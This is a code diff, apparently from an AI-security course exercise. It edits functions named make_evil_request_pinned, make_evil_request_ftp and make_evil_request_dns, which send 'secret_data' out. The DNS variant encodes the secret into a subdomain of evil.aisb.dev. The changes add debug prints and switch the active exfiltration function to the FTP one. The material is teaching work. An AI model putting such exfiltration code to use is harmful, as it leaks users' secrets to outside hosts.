@@ -97,8 +97,10 @@ def make_evil_request_pinned(secret_data: str) -> Optional[str]:
         if result.status_code == 200:
             return result.text
         else:
+            print("Something happened here")
             return None
     except Exception:
+        print("Something also happened here")
         return None
 
 
@@ -135,9 +137,10 @@ def make_evil_request_ftp(secret_data: str) -> Optional[str]:
         str_result = str(result)
         # print(str_result)
         return str_result
-    except Exception:
+    except Exception as e:
+        print(f"What happened here? {e}")
         return None
-
+    
 
 from w1d2_test import test_make_evil_request_ftp
 
@@ -163,7 +166,7 @@ def make_evil_request_dns(secret_data: str) -> Optional[str]:
         secret_encoded = base64.urlsafe_b64encode(secret_data.encode("UTF-8"))
         secret_url = secret_encoded.decode("UTF-8")
         url = f"{secret_url}.evil.aisb.dev"
-        res = resolver.resolve(url, 'TXT')
+        res = resolver.resolve(url, "TXT")
         if len(res) > 0:
             res2 = res[0].to_text()
             return res2
@@ -172,14 +175,16 @@ def make_evil_request_dns(secret_data: str) -> Optional[str]:
     except:
         return None
 
+
 # %%
-from w1d2_test import test_make_evil_request_dns
+# from w1d2_test import test_make_evil_request_dns
 
-test_make_evil_request_dns(make_evil_request_dns, resolver)
+# test_make_evil_request_dns(make_evil_request_dns, resolver)
 
-# Set the exfiltration function for use in the exercise
-exfiltrate_data = make_evil_request_dns
+# # Set the exfiltration function for use in the exercise
+# exfiltrate_data = make_evil_request_dns
 
+exfiltrate_data = make_evil_request_ftp
 # %%
 
 
